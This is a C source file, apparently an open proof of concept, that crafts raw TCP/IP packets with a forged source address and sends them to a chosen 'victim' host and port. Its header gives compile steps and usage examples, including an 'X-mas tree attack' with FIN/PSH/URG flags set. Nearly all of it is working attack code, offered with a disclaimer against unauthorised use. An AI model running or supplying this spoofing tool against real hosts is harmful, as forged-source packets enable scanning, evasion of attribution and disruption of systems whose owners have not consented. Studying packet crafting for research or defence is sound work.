/*
    Purpose:
        Demonstrate a PoC for dealing with raw sockets. The driver for this 
        was to provide an interface for spoofing a source IPv4 address or 
        hostname.

        This is a proof of concept and is not intended to:
        - Be free of bugs
        - Be used maliciously
        - Target any asset without prior authorization
        - Be modified with any intent outside of personal research or learning
        ** See the license that should accompany this README and code.
    Developer:
        Ray Daley (https://github.com/darkestb4light)
    Note:
        To get deeper than the typical app layer, we need to deal with raw 
        sockets. This requires elevated privileges since you could do evil 
        things. 

        The source argument passed will be inputted into the source address 
        field of the IP header. The destination address will be inputted 
        into the destination field of the IP header. The destination port 
        will be placed into the destination port field of the TCP header.
        The intent would be to use a source address that is NOT the real 
        source address or hostname, thereby creating a "spoof" scenario.

        On BSD systems (OSX and FREEBSD), spoofing 127.0.0.1 causes sendto(2) 
        to fail with: "Can't assign requested address". Use another source 
        address or hostname.
    Compile: 
        $ gcc -D <TARGET-OS> -o spoof spoof.c

        Where <TARGET-OS> is one of: LINUX, FREEBSD, or OSX (depending on the 
        platform you are compiling on).
    Usage: 
        spoof [options] <arguments>
        spoof <arguments> [options]

        [Options]
        -f <tcpflag> # One or more TCP flags to enable. If using
                     # more than one flag, each should be appended
                     # together (e.g. ASRF). The available flags are:
                     # A or a (enables the ACK bit)
                     # C or c (enables the CWR bit)
                     # E or e (enables the ECE bit)
                     # F or f (enables the FIN bit)
                     # P or p (enables the PSH bit)
                     # R or r (enables the RST bit)
                     # S or s (enables the SYN bit)
                     # U or u (enables the URG bit)
        
        [Arguments]
        -s <src>     # Source IPv4 address or hostname to spoof
        -d <dst>     # Destination IPv4 address or hostname of victim
        -p <dport>   # Destination port to send spoofed TCP packet

        Execute (example 1):
        
        $ sudo ./spoof -s 123.45.67.8 -d 192.168.0.10 -p 55555

        The above will not set any TCP flags, spoof the source address 
        "123.45.67.8", and send a packet to the destination "192.168.0.10" 
        over TCP port of 55555.

        Execute (example 2):

        $ sudo ./spoof -f FPU -d my.victim.com -p 1337 -s foobar.com 

        The above will set the FIN/PSH/URG bits (AKA X-mas tree attack), spoof 
        the source address "foobar.com", and send a packet to the destination 
        "my.victim.com" over TCP port of 1337.
*/

#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>

#ifdef LINUX
    #include <linux/ip.h>
    #include <linux/tcp.h>
#elif FREEBSD | OSX
    #include <netinet/in.h>
    #include <netinet/ip.h>
    #include <netinet/tcp.h>
#else
    #error Target OS macro not specified or unsupported.
    #error Use supported macro: -D LINUX, -D FREEBSD, or -D OSX
    #error Aborting compilation.
#endif

#ifdef OSX
    #define AVOID_IPLEN_HTONS 1
#else
    #define AVOID_IPLEN_HTONS 0
#endif

#define NAME	        "spoof"
#define MIN_ARG         7
#define MAX_ARG         9
#define MAX_OPTS        4
#define MAX_FLAGS       8
#define HOST_SZ         255

/* Flags for IP header */
#define IP_HDRLEN       5   /* header length */
#define IP_VER          4   /* version */
#define IP_TYPEOFSERV   0   /* type of service */
#define IP_TOTLEN       0   /* total length (computed after building IP/TCP headers) */
#define IP_FRAGOFF      0   /* fragment offset */
#define IP_TIMETOLIVE   64  /* time to live */
#define IP_PROTO        6   /* protocol */
#define IP_CHKSUM       0   /* checksum */

/* Flags for TCP header */
#define TCP_DATAOFF     5   /* data offset */
#define TCP_CHECKSUM    0   /* checksum */

void usage(void);

int main(int argc, char **argv)
{
    int                 i, j, optflag[MAX_OPTS], res, dport, 
                        sd, pktsz, optval = 1;
    char                *opt[MAX_OPTS] = {"-f", "-s", "-d", "-p"}, 
                        *flag, *src, *dst,
                        tcpflags[MAX_FLAGS][2] = {{'a', '0',},
                                                  {'c', '0',},
                                                  {'e', '0',},
                                                  {'f', '0',}, 
                                                  {'p', '0',},
                                                  {'r', '0',},
                                                  {'s', '0',},
                                                  {'u', '0'}};
    unsigned char       data[0]; /* no data (payload) segment */
    struct addrinfo     hints, *result;
    struct sockaddr_in  sa_in, *saddr, *daddr;
    struct tcphdr       tcp_hdr;
	
    /* process arguments */
    if(argc != MIN_ARG && argc != MAX_ARG) usage();
    
    for(i = 1; i != argc; ++i)
    {
        if(strncmp(argv[i], opt[0], 3) == 0){
            flag = argv[++i];
            while(*flag != '\0')
            {
                optflag[0] = 0;
                for(j = 0; j != MAX_FLAGS; ++j)
                {
                    if(tolower(*flag) == *tcpflags[j]){
                        optflag[0] = 1;
                        tcpflags[j][1] = '1';
                        break;
                    }
                }
                if(! optflag[0]){
                    fprintf(stderr, "%s: %s: %s: %c\n", NAME, argv[i-1], 
                        "invalid TCP flag", *flag);
                    usage();
                }
                switch(*flag){
                case 'A':
                case 'a':
                    printf("%s: flag: ACK bit on\n", NAME);
                    break;
                case 'C':
                case 'c':
                    printf("%s: flag: CWR bit on\n", NAME);
                    break;
                case 'E':
                case 'e':
                    printf("%s: flag: ECE bit on\n", NAME);
                    break;
                case 'F':
                case 'f':
                    printf("%s: flag: FIN bit on\n", NAME);
                    break;
                case 'P':
                case 'p':
                    printf("%s: flag: PSH bit on\n", NAME);
                    break;
                case 'R':
                case 'r':
                    printf("%s: flag: RST bit on\n", NAME);
                    break;
                case 'S':
                case 's':
                    printf("%s: flag: SYN bit on\n", NAME);
                    break;
                case 'U':
                case 'u':
                    printf("%s: flag: URG bit on\n", NAME);
                }
                flag++;
            }
        }else{
            if(strncmp(argv[i], opt[1], 3) == 0){
                optflag[1] = 0;
                if((src = (char *) malloc(HOST_SZ)) == NULL){
                    fprintf(stderr, "%s: src: malloc: %s\n", NAME, strerror(errno));
                    exit(1);
                }
                memset(&hints, 0, sizeof(struct addrinfo));
                memset(src, 0, HOST_SZ);
                hints.ai_family = AF_INET;
                if((res = getaddrinfo(argv[++i], NULL, &hints, &result)) != 0){
                    fprintf(stderr, "%s: src: getaddrinfo: %s\n", NAME, gai_strerror(res));
                    exit(1);
                }
                saddr = (struct sockaddr_in *) result->ai_addr;
                memmove(src, inet_ntoa(saddr->sin_addr), HOST_SZ);
                optflag[1] = 1;
                printf("%s: source IP: %s\n", NAME, src);
            }else if(strncmp(argv[i], opt[2], 3) == 0){
                optflag[2] = 0;
                if((dst = (char *) malloc(HOST_SZ)) == NULL){
                    fprintf(stderr, "%s: dst: malloc: %s\n", NAME, strerror(errno));
                    exit(1);
                }
                memset(&hints, 0, sizeof(struct addrinfo));
                memset(dst, 0, HOST_SZ);
                hints.ai_family = AF_INET;   
                if((res = getaddrinfo(argv[++i], NULL, &hints, &result)) != 0){
                    fprintf(stderr, "%s: dst: getaddrinfo: %s\n", NAME, gai_strerror(res));
                    exit(1);
                }
                daddr = (struct sockaddr_in *) result->ai_addr;
                memmove(dst, inet_ntoa(daddr->sin_addr), HOST_SZ);   
                printf("%s: destination IP: %s\n", NAME, dst);
                optflag[2] = 1;
            }else if(strncmp(argv[i], opt[3], 3) == 0){
                optflag[3] = 0;
                dport = strtol(argv[++i], 0, 10);
                if(dport < 0 || dport > 65535){
                    fprintf(stderr, "%s: destination port outside of range: %d\n", NAME, dport);
                    exit(1);
                }
                optflag[3] = 1;
                printf("%s: destination port: %d\n", NAME, dport);
            }else{
                fprintf(stderr, "%s: invalid argument passed: %s\n", NAME, argv[i]);
                usage();
            }
        }
    }
    
    for(i = 1; i < MAX_OPTS; ++i)
    {
        if(! optflag[i]){
            fprintf(stderr, "%s: missing a required argument: %s\n", NAME, opt[i]);
            exit(1);
        }
    }
    
    /* socket address */
    sa_in.sin_family = AF_INET;
    sa_in.sin_port = htons(dport);
    sa_in.sin_addr.s_addr = inet_addr(dst);
    
    srand(time(0)); /* get some better entropy for rand(3) */
     
#ifdef LINUX
    struct iphdr ip_hdr;
	
    /* IP header */	
    ip_hdr.ihl = IP_HDRLEN;
    ip_hdr.version = IP_VER;
    ip_hdr.tos = IP_TYPEOFSERV;
    ip_hdr.tot_len = IP_TOTLEN;
    ip_hdr.frag_off = IP_FRAGOFF;
    ip_hdr.ttl = IP_TIMETOLIVE;
    ip_hdr.protocol = IP_PROTO;
    ip_hdr.check = IP_CHKSUM;
    ip_hdr.id = htons(rand() % 65535);
    ip_hdr.saddr = inet_addr(src);
    ip_hdr.daddr = inet_addr(dst);  
	
    /* TCP header */
    tcp_hdr.doff = TCP_DATAOFF;
    tcp_hdr.ack = strtol(&(tcpflags[0][1]), 0, 10);
    tcp_hdr.cwr = strtol(&(tcpflags[1][1]), 0, 10);
    tcp_hdr.ece = strtol(&(tcpflags[2][1]), 0, 10);
    tcp_hdr.fin = strtol(&(tcpflags[3][1]), 0, 10);
    tcp_hdr.psh = strtol(&(tcpflags[4][1]), 0, 10);
    tcp_hdr.rst = strtol(&(tcpflags[5][1]), 0, 10);
    tcp_hdr.syn = strtol(&(tcpflags[6][1]), 0, 10);
    tcp_hdr.urg = strtol(&(tcpflags[7][1]), 0, 10);
    tcp_hdr.check = TCP_CHECKSUM;
    tcp_hdr.window = htons(0);
    tcp_hdr.urg_ptr = htons(0);
    tcp_hdr.source = htons(rand() % 65535);
    tcp_hdr.dest = htons(dport);
    tcp_hdr.seq = htonl(rand() % UINT_MAX);
    tcp_hdr.ack_seq = htonl(0);

    ip_hdr.tot_len = htons(sizeof(ip_hdr) + sizeof(tcp_hdr) + sizeof(data));
#elif FREEBSD | OSX
    struct ip ip_hdr;
    unsigned int tcp_flags = 0;
	
    /* IP header */	
    ip_hdr.ip_hl = IP_HDRLEN;
    ip_hdr.ip_v = IP_VER;
    ip_hdr.ip_tos = IP_TYPEOFSERV;
    ip_hdr.ip_len = IP_TOTLEN;
    ip_hdr.ip_off = IP_FRAGOFF;
    ip_hdr.ip_ttl = IP_TIMETOLIVE;
    ip_hdr.ip_p = IP_PROTO;
    ip_hdr.ip_sum = IP_CHKSUM;
    ip_hdr.ip_id = htons(rand() % 65535);
    ip_hdr.ip_src.s_addr = inet_addr(src);
    ip_hdr.ip_dst.s_addr = inet_addr(dst);

    /* TCP header */
    tcp_hdr.th_off = TCP_DATAOFF;
    if(strtol(&(tcpflags[0][1]), 0, 10)) tcp_flags |= TH_ACK;
    if(strtol(&(tcpflags[1][1]), 0, 10)) tcp_flags |= TH_CWR;
    if(strtol(&(tcpflags[2][1]), 0, 10)) tcp_flags |= TH_ECE;
    if(strtol(&(tcpflags[3][1]), 0, 10)) tcp_flags |= TH_FIN;
    if(strtol(&(tcpflags[4][1]), 0, 10)) tcp_flags |= TH_PUSH;
    if(strtol(&(tcpflags[5][1]), 0, 10)) tcp_flags |= TH_RST;
    if(strtol(&(tcpflags[6][1]), 0, 10)) tcp_flags |= TH_SYN;
    if(strtol(&(tcpflags[7][1]), 0, 10)) tcp_flags |= TH_URG;
    tcp_hdr.th_flags = tcp_flags;
    tcp_hdr.th_sum = TCP_CHECKSUM;
    tcp_hdr.th_win = htons(0);
    tcp_hdr.th_urp = htons(0);
    tcp_hdr.th_sport = htons(rand() % 65535);
    tcp_hdr.th_dport = htons(dport);
    tcp_hdr.th_seq = (rand() % UINT_MAX);
    tcp_hdr.th_ack = htonl(0);

    if(AVOID_IPLEN_HTONS)
        ip_hdr.ip_len = sizeof(ip_hdr) + sizeof(tcp_hdr) + sizeof(data);
    else
        ip_hdr.ip_len = htons(sizeof(ip_hdr) + sizeof(tcp_hdr) + sizeof(data));
#else /* should never fire if macro definitions are in sync */
    fprintf(stderr, "%s: target OS macro integrity issue - aborting.\n", NAME);
    exit(1);
#endif
    
    printf("%s: headers set for TCP/IP\n", NAME);
    
    /* create socket */
    if((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
        fprintf(stderr, "%s: socket: %s\n", NAME, strerror(errno));
        exit(1);
    }
    	
    printf("%s: raw socket descriptor created\n", NAME);
	
    /* set socket options */
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0){
        fprintf(stderr, "%s: setsockopt: %s\n", NAME, strerror(errno));
        exit(1);
    }
	
    printf("%s: socket options set\n", NAME);
	
    /* build packet */
    pktsz = sizeof(ip_hdr) + sizeof(tcp_hdr) + sizeof(data);
    unsigned char pkt[pktsz];
    memcpy(pkt, &ip_hdr, sizeof(ip_hdr));
    memcpy(pkt + sizeof(ip_hdr), &tcp_hdr, sizeof(tcp_hdr));
    memcpy(pkt + sizeof(ip_hdr) + sizeof(tcp_hdr), data, sizeof(data));
    
    printf("%s: packet built\n", NAME);
	
    /* send packet */
    if(sendto(sd, pkt, sizeof(pkt), 0, (struct sockaddr *)&sa_in, sizeof(sa_in)) < 0){
        fprintf(stderr, "%s: sendto: %s\n", NAME, strerror(errno));
        exit(1);
    }

    printf("%s: packet sent from %s to %s:%d\n", NAME, src, dst, dport);

    /* clean up */
    free(src);
    free(dst);
    freeaddrinfo(result);

    exit(0);
}
void usage(void)
{           
    fprintf(stderr, "Usage:\n\t%s %s\n\t%s %s %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s", 
        NAME, "[options] <arguments>", NAME, "<arguments> [options]\n",
        "\n[Options]\n",
        "-f <tcpflag...>\t# Optional TCP flag(s) to enable. If using\n",
        "\t\t# more than one flag, each should be appended\n",
        "\t\t# together (e.g. ASRF). The available flags are:\n",
        "\t\t# A or a (enables the ACK bit)\n",
        "\t\t# C or c (enables the CWR bit)\n",
        "\t\t# E or e (enables the ECE bit)\n",
        "\t\t# F or f (enables the FIN bit)\n",
        "\t\t# P or p (enables the PSH bit)\n",
        "\t\t# R or r (enables the RST bit)\n",
        "\t\t# S or s (enables the SYN bit)\n",
        "\t\t# U or u (enables the URG bit)\n\n",
        "[Arguments]\n",
        "-s <src>\t# Source IPv4 address or hostname to spoof\n", 
        "-d <dst>\t# Destination IPv4 address or hostname of victim\n",
        "-p <dport>\t# Destination port to send spoofed TCP packet\n\n");
        
    exit(1);
}
